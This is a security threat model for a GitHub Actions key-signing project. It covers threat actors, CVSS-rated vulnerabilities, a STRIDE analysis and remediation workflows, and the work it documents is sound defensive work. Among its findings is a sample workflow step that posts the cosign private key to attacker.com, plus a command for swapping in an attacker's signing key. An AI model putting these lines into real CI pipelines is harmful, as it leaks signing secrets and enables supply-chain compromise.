# Security

This document specifies the threat model, vulnerabilities, and security controls for bot-signer-oversight.

## Executive Summary

The current implementation has three critical vulnerabilities with CVSS scores above 8.5. The proposed keyless architecture eliminates the most critical vulnerability (ADMIN_TOKEN) and reduces attack surface.

**Critical Finding:** ADMIN_TOKEN represents single point of total compromise with no mitigating controls.

## Threat Model

### Threat Actors

**T1: External Attacker**
- Motivation: Supply chain compromise, code injection
- Capabilities: Network access, common exploits
- Access: None initially
- Sophistication: Low to High

**T2: Malicious Insider**
- Motivation: Backdoor injection, data theft
- Capabilities: PR submission, limited repo access
- Access: Read/write to branches
- Sophistic

ation: Medium

**T3: Compromised Admin**
- Motivation: Inherits attacker's goals
- Capabilities: Full repository access, secret modification
- Access: Admin-level
- Sophistication: Inherits admin's access level

**T4: Supply Chain Attacker**
- Motivation: Compromise via dependencies
- Capabilities: Control of upstream binary (cosign, gitsign)
- Access: Achieves code execution
- Sophistication: High

**T5: ADMIN_TOKEN Holder**
- Motivation: After token theft
- Capabilities: All admin:repo permissions
- Access: API-level admin
- Sophistication: Medium

### Attack Vectors

**AV1: ADMIN_TOKEN Compromise** (Critical)
- Surface: Token in developer environment or secrets
- Vector: Phishing, malware, credential theft
- Impact: Total system compromise

**AV2: Workflow Injection** (Critical)
- Surface: Pull request workflow modifications
- Vector: Malicious PR modifying `.github/workflows/*.yml`
- Impact: Arbitrary code execution with secret access

**AV3: Binary Substitution** (Critical)
- Surface: Workflows download binaries without verification
- Vector: MitM attack or compromised GitHub
- Impact: Malicious binary execution with secret access

**AV4: Secret Exfiltration** (High)
- Surface: Any workflow with secret access
- Vector: Add network call to exfiltrate secrets
- Impact: Private key disclosure

**AV5: Git History Manipulation** (Medium)
- Surface: Force push, rebase
- Vector: Admin force-pushing rewritten history
- Impact: Audit trail destruction

**AV6: Ceremony Log Tampering** (Medium)
- Surface: `changelog.txt` file
- Vector: Modify log in unsigned commit
- Impact: False audit trail

**AV7: Public Key Substitution** (Medium)
- Surface: `cosign.pub`, `pgp.pub` files
- Vector: Replace with attacker keys
- Impact: Unable to verify legitimate signatures

## Vulnerability Assessment

### Critical Vulnerabilities (CVSS 9.0-10.0)

**V-CRITICAL-01: ADMIN_TOKEN Single Point of Compromise**
- CVSS: 9.3 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
- CWE: CWE-798 (Hard-coded Credentials), CWE-308 (Single-factor Authentication)
- Description: Anyone with ADMIN_TOKEN can replace signing keys silently
- Exploit: `gh secret set COSIGN_PRIVATE_KEY < attacker_key`
- Impact: Complete cryptographic identity compromise
- Remediation: Remove secret storage, use OIDC keyless signing

**V-CRITICAL-02: Workflow Injection with Secret Access**
- CVSS: 9.0 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)
- CWE: CWE-94 (Code Injection), CWE-506 (Embedded Malicious Code)
- Description: Malicious workflow modification can exfiltrate secrets
- Exploit:
  ```yaml
  - run: curl -X POST https://attacker.com/collect \
      -d "key=${{ secrets.COSIGN_PRIVATE_KEY }}"
  ```
- Impact: All private keys disclosed
- Remediation: Require workflow review, use branch protection with CODEOWNERS

**V-CRITICAL-03: No Binary Integrity Verification**
- CVSS: 8.5 (AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:L)
- CWE: CWE-494 (Download Without Integrity Check)
- Description: Workflows download binaries without signature/checksum verification
- Location: init.yml:26-34, test.yml:26-35
- Exploit: MitM attack or compromised GitHub Releases
- Impact: Arbitrary code execution with secret access
- Remediation: Verify binary checksums or signatures before execution

### High Vulnerabilities (CVSS 7.0-8.9)

**V-HIGH-01: Ceremony Log Not Signed**
- CVSS: 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L)
- CWE: CWE-345 (Insufficient Data Authenticity Verification)
- Description: `changelog.txt` can be modified without detection
- Impact: False audit trail, attackers backdate entries
- Remediation: Create detached signature of ceremony log

**V-HIGH-02: No Key Rotation**
- CVSS: 7.2 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L)
- CWE: CWE-324 (Use of Key Past Expiration)
- Description: Keys cannot be rotated
- Impact: Prolonged key exposure increases compromise risk
- Remediation: Implement rotate.yml workflow with continuity proof

**V-HIGH-03: Git History Manipulation**
- CVSS: 7.0 (AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:H)
- CWE: CWE-353 (Missing Integrity Check)
- Description: Force push rewrites signed commit history
- Impact: Audit trail destruction
- Remediation: Enforce branch protection with administrator enforcement

**V-HIGH-04: Secrets Accessible to All Workflows**
- CVSS: 7.1 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)
- CWE: CWE-269 (Improper Privilege Management)
- Description: No compartmentalization between workflows
- Impact: Any workflow accesses signing keys
- Remediation: Use GitHub Environment secrets with required reviewers

**V-HIGH-05: Gitsign Certificates Expire**
- CVSS: 7.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H)
- CWE: CWE-324 (Use of Key Past Expiration)
- Description: Gitsign commits unverifiable locally after 10 minutes
- Impact: Verification failure, Rekor dependency
- Remediation: Use static keys or document Rekor verification

### Medium Vulnerabilities (CVSS 4.0-6.9)

**V-MEDIUM-01: Shred Ineffective on SSD**
- CVSS: 6.0 (AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:N/A:N)
- Description: `shred` may not delete keys on SSD/CoW filesystems
- Mitigation: Runner ephemerality provides protection

**V-MEDIUM-02: No Automated Verification**
- CVSS: 5.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H)
- Description: No workflow verifies signatures remain valid
- Impact: Drift or compromise undetected
- Remediation: Create verify.yml workflow

**V-MEDIUM-03: Circular Trust**
- CVSS: 5.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)
- Description: No external trust anchor for initial keys
- Impact: Bootstrap trust depends on GitHub Actions run
- Acceptance: Inherent to design

## STRIDE Analysis

### Spoofing

**S1: Attacker triggers workflow as legitimate user**
- Mitigated by: GitHub authentication
- Residual Risk: High (workflow trigger not in artifacts)

**S2: Attacker commits with stolen key**
- Mitigated by: Key protection
- Residual Risk: Critical if key compromised

### Tampering

**T1: Attacker modifies ceremony log**
- Mitigated by: Commit signing
- Residual Risk: Medium (unsigned commits possible)

**T2: Attacker replaces keys in secrets**
- Mitigated by: None
- Residual Risk: Critical (ADMIN_TOKEN enables this)

**T3: Attacker modifies workflows**
- Mitigated by: Branch protection (if enabled)
- Residual Risk: High (admins bypass)

### Repudiation

**R1: Actor claims didn't trigger initialization**
- Mitigated by: GitHub Actions logs (90-day retention)
- Residual Risk: Low

**R2: Admin claims didn't modify secrets**
- Mitigated by: GitHub audit log (Enterprise only)
- Residual Risk: High (not available without Enterprise)

### Information Disclosure

**I1: Secrets leaked in logs**
- Mitigated by: GitHub secret masking
- Residual Risk: Medium (masking bypassed via base64/hex)

**I2: Private keys exfiltrated via workflow**
- Mitigated by: Code review
- Residual Risk: High (no automated detection)

### Denial of Service

**D1: Attacker deletes secrets**
- Mitigated by: None
- Residual Risk: Medium (recoverable but breaks continuity)

**D2: Attacker exhausts Actions minutes**
- Mitigated by: GitHub rate limits
- Residual Risk: Low

### Elevation of Privilege

**E1: Contributor escalates to admin**
- Mitigated by: Branch protection
- Residual Risk: High (if not configured)

**E2: Attacker gains ADMIN_TOKEN**
- Mitigated by: None
- Residual Risk: Critical

## Risk Matrix

| ID | Threat | Likelihood | Impact | Score | Priority |
|----|--------|-----------|--------|-------|----------|
| **Critical** |
| C1 | ADMIN_TOKEN compromise → key replacement | Medium | Critical | 9.0 | P0 |
| C2 | Workflow injection → secret exfiltration | Medium | Critical | 8.5 | P0 |
| C3 | Supply chain attack → malicious binary | Low | Critical | 7.5 | P1 |
| **High** |
| H1 | Git history rewrite → audit loss | Low | High | 6.5 | P1 |
| H2 | Public key substitution | Low | High | 6.0 | P2 |
| H3 | Ceremony log tampering | Medium | Medium | 6.0 | P2 |
| H4 | No key rotation | High | Medium | 6.5 | P1 |
| H5 | Secret logging | Low | High | 6.0 | P2 |

Risk Score = Likelihood (1-5) × Impact (1-5) × 0.4

## Security Controls

### Preventive Controls

**PC-01: Key Password Protection**
- Status: Not implemented (empty passwords by design)
- Effectiveness: N/A
- Rationale: Accepted risk for operational simplicity

**PC-02: Branch Protection**
- Status: Recommended but not enforced
- Effectiveness: High (prevents unauthorized workflow modification)
- Gaps: Admins can bypass

**PC-03: Ephemeral Runners**
- Status: Implemented (GitHub-hosted)
- Effectiveness: Medium (runner destroyed after execution)
- Gaps: No guarantee of secure deletion

**PC-04: Fail-Fast Error Handling**
- Status: Implemented (`set -euo pipefail`)
- Effectiveness: High (prevents partial ceremonies)

### Detective Controls

**DC-01: Signed Commits**
- Status: Implemented
- Effectiveness: High (tamper-evident history)
- Gaps: No automated verification

**DC-02: Ceremony Log**
- Status: Partial (not signed)
- Effectiveness: Medium (useful but not tamper-proof)

**DC-03: GitHub Actions Logs**
- Status: Implemented
- Effectiveness: Medium (90-day retention, admin-deletable)

**DC-04: Rekor Transparency Log**
- Status: Implemented (gitsign)
- Effectiveness: Excellent (public, immutable)
- Coverage: Only gitsign commits

**DC-05: GitHub Audit Log**
- Status: Requires Enterprise
- Effectiveness: High (secret modification tracking)
- Availability: Not accessible to free/pro plans

### Corrective Controls

**CC-01: Key Rotation**
- Status: Not implemented
- Criticality: High

**CC-02: Incident Response**
- Status: Not documented
- Criticality: High

### Missing Controls

1. **Runtime monitoring** - No detection of anomalous workflow behavior
2. **Network egress controls** - Workflows connect to any endpoint
3. **Binary verification** - No signature/checksum checks
4. **Secret access logging** - No visibility into secret access
5. **Multi-party approval** - No N-of-M signing
6. **Anomaly detection** - No alerting on unusual patterns

## Residual Risks

### R1: ADMIN_TOKEN Compromise (Critical)
- Control: None
- Likelihood: Medium
- Impact: Total system compromise
- Acceptance: Must be explicitly accepted
- Recommendation: Do not use for high-value assets

### R2: GitHub Platform Compromise (High)
- Control: None (external dependency)
- Likelihood: Very Low
- Impact: Critical
- Acceptance: Acceptable for low/medium sensitivity
- Recommendation: Document as fundamental limitation

### R3: Workflow Injection (Medium with branch protection)
- Control: Branch protection
- Likelihood: Low with code review
- Impact: Critical
- Acceptance: Requires branch protection enabled
- Recommendation: Enforce in documentation

### R4: No Key Rotation (High)
- Control: None
- Likelihood: High (keys never rotated)
- Impact: Medium
- Acceptance: Short-term use only
- Recommendation: Implement for long-term use

## Security Recommendations

### P0: Critical (Implement Before Use)

**P0-1: Verify Binary Integrity**
```yaml
- name: Verify Cosign Binary
  run: |
    EXPECTED_SHA256="<known-good-hash>"
    echo "${EXPECTED_SHA256}  cosign-linux-amd64" | sha256sum -c -
```

**P0-2: Enforce Branch Protection**
```yaml
- name: Check Branch Protection
  run: |
    PROTECTION=$(gh api repos/$GITHUB_REPOSITORY/branches/main/protection \
      --jq '.required_pull_request_reviews.required_approving_review_count' || echo "0")
    if [ "$PROTECTION" -lt 1 ]; then
      echo "ERROR: Branch protection not enabled"
      exit 1
    fi
```

**P0-3: Implement CODEOWNERS**
```
/.github/workflows/ @security-team
/cosign.pub @security-team
/pgp.pub @security-team
```

### P1: High (Implement Within 30 Days)

**P1-1: Create Verification Workflow**
```yaml
name: Verify Signatures
on:
  push:
  schedule:
    - cron: '0 */6 * * *'
jobs:
  verify:
    steps:
      - name: Verify Recent Commits
        run: |
          for commit in $(git log -10 --format=%H); do
            git verify-commit $commit || exit 1
          done
```

**P1-2: Implement Key Rotation**
- Create rotate.yml workflow
- Sign new ceremony log with old keys
- Update secrets with new keys

**P1-3: Sign Ceremony Log**
```bash
gpg --detach-sign --armor -o changelog.txt.asc changelog.txt
cosign sign-blob --key env://COSIGN_PRIVATE_KEY \
  --output-signature changelog.txt.sig changelog.txt
```

**P1-4: Separate Key Storage**
- Create vault repository with different admins
- Use repository_dispatch for signing requests
- Implement approval workflow

### P2: Medium (Implement Within 90 Days)

**P2-1: Secret Access Monitoring**
- Log all secret access to external system
- Alert on unusual access patterns

**P2-2: Network Egress Monitoring**
- Log network connections
- Analyze for unexpected destinations

**P2-3: Use Environment Secrets**
```yaml
jobs:
  sign:
    environment:
      name: key-operations
```
Requires manual approval for secret access.

## Compliance Alignment

### SLSA (Supply Chain Levels)

- Level 1: Source control and versioning
- Level 2: Provenance attestations
- Level 3: Partial (lacks hardened build platform)
- Level 4: No two-party review

**Gaps for Level 3:**
- No hardened build environment
- No provenance verification in pipeline

### SOC 2 Type II

- Logical access: GitHub access controls only
- Change management: Signed commits
- Key management: No rotation

**Gaps:**
- No access reviews
- No key rotation schedule
- No automated monitoring

### ISO 27001

- A.9 Access Control: Limited by platform
- A.10 Cryptography: Documented lifecycle
- A.12 Operations Security: GitHub-dependent

**Gaps:**
- No periodic access certification
- No key escrow
- No compliance reporting

### FedRAMP

- Not achievable without HSM
- SC-12, SC-13 require FIPS 140-2 validated cryptography
- Would require HSM-backed production mode

## Operational Security

### OPSEC-1: ADMIN_TOKEN Management
- Generate token with `admin:repo` scope only
- Store in password manager with MFA
- Rotate every 90 days
- Revoke on personnel changes

### OPSEC-2: Workflow Review
- Require two reviewers for workflow changes
- Review for network connections, secret access
- Check binary downloads

### OPSEC-3: Periodic Verification
- Run verification weekly
- Compare ceremony dates with secret modification timestamps
- Review Actions logs monthly

### OPSEC-4: Incident Response

If compromise suspected:

1. Revoke ADMIN_TOKEN immediately
2. Rotate all keys
3. Audit all commits since last known-good state
4. Notify stakeholders
5. Document in ceremony log

### OPSEC-5: Least Privilege
- Minimize repository admin count
- Use Teams for access control
- Implement environment protection rules

## Risk Acceptance Requirements

Organizations using this system must accept:

1. GitHub platform trust (all security depends on GitHub)
2. ADMIN_TOKEN risk (single credential compromises system)
3. No HSM (keys in software secrets)
4. No key rotation (keys cannot be easily rotated)
5. Circular trust (no external anchor)
6. Limited audit (without Enterprise, no secret tracking)
7. Workflow review dependency (security depends on human review)

## Migration from Static Keys

### Comparison: Static vs Keyless

| Aspect | Static Keys | Keyless OIDC |
|--------|-------------|--------------|
| Key Storage | GitHub Secrets (ADMIN_TOKEN) | No persistent keys |
| ADMIN_TOKEN | Required (CVSS 9.3 vulnerability) | Eliminated |
| Identity | Static keypairs | GitHub Actions OIDC token |
| GPG Keys | Persistent, stored in secrets | Ephemeral, 10-minute lifetime |
| Cosign Keys | Static ECDSA key | Fulcio-issued certificates |
| Commit Signing | GPG with static key | Gitsign with x509 certificates |
| Verification | Requires key import | Rekor transparency log |
| Security | Single point of compromise | Distributed trust (OIDC + Rekor) |

### Security Improvements

**1. No Secret Storage**
- ADMIN_TOKEN removed (eliminates CVSS 9.3 vulnerability)
- No private keys in GitHub Secrets
- Keys generated on-demand, expire after 10 minutes

**2. OIDC-Based Identity**
- Identity from GitHub's OIDC provider
- Token contains workflow context (repo, ref, SHA)
- Trust anchored in GitHub platform, not static keys

**3. Transparency Logging**
- All signatures logged to Rekor
- Public, immutable, append-only log
- Long-term verification even after certificates expire

**4. Ceremony Logs**
- Complete audit trail for each signing operation
- Links signatures to workflow run
- Includes identity claims and verification commands

### Migration Steps

Existing users should:

1. Remove static secrets from GitHub repository
2. Update workflows to use `id-token: write` permission
3. Switch to keyless signing workflows
4. Verify signatures using Rekor transparency log

## References

- [NIST SP 800-204D](https://csrc.nist.gov/publications/detail/sp/800-204d/draft) - DevSecOps
- [OWASP Top 10 CI/CD](https://owasp.org/www-project-top-10-ci-cd-security-risks/) - CI/CD risks
- [SLSA Specification](https://slsa.dev/spec/v1.0/) - Supply chain levels
- [CWE Top 25](https://cwe.mitre.org/top25/) - Common weakness enumeration
- [CVSS v3.1 Specification](https://www.first.org/cvss/v3.1/specification-document) - Vulnerability scoring
